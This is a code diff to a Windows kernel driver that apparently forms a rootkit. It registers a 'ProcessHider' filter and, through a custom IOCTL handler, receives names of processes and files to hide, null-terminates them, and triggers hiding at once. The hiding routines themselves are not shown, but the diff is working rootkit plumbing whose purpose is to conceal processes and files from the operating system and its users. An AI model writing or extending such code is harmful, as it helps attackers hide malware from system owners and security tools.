@@ -23,6 +23,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path
         return STATUS_UNSUCCESSFUL;
     }
 
+    status = filter::ProcessHider::Register();
+
+    if (!NT_SUCCESS(status))
+    {
+        DebugMessage("ProcessFilter: Register not successfull\n");
+        return STATUS_UNSUCCESSFUL;
+    }
+
     driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleCustomIOCTL;
 
     // routines that will execute once a handle to our device's symbolik link is opened/closed
@@ -48,14 +56,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path
     else
     {
         DebugMessage("Error creating symbolic link %wZ", DEVICE_SYMBOLIC_NAME);
-    }
-
-    status = filter::ProcessHider::Register();
-
-    if (!NT_SUCCESS(status))
-    {
-        DebugMessage("ProcessFilter: Register not successfull\n");
-        return STATUS_UNSUCCESSFUL;
     }
 
     return STATUS_SUCCESS;
@@ -111,12 +111,15 @@ NTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT device_object, PIRP irp)
                 case L'p':
                     KeAcquireGuardedMutex(&filter::ProcessHider::process_name_lock_);
                     RtlCopyMemory(&filter::ProcessHider::process_to_hide_, (PWCHAR)((PUCHAR)irp->AssociatedIrp.SystemBuffer + 4), (msg_sz - 2) * sizeof(WCHAR));
+                    filter::ProcessHider::process_to_hide_[msg_sz - 2] = 0;
                     DebugMessage("Hide process %S", filter::ProcessHider::process_to_hide_);
                     KeReleaseGuardedMutex(&filter::ProcessHider::process_name_lock_);
+                    filter::ProcessHider::HideOnInitializeOperation();
                     break;
                 case L'f':
                     KeAcquireGuardedMutex(&filter::FileFilter::file_name_lock_);
                     RtlCopyMemory(&filter::FileFilter::file_to_hide_, (PWCHAR)((PUCHAR)irp->AssociatedIrp.SystemBuffer + 4), (msg_sz - 2) * sizeof(WCHAR));
+                    filter::FileFilter::file_to_hide_[msg_sz - 2] = 0;
                     DebugMessage("Hide file %S", filter::FileFilter::file_to_hide_);
                     KeReleaseGuardedMutex(&filter::FileFilter::file_name_lock_);
                     break;
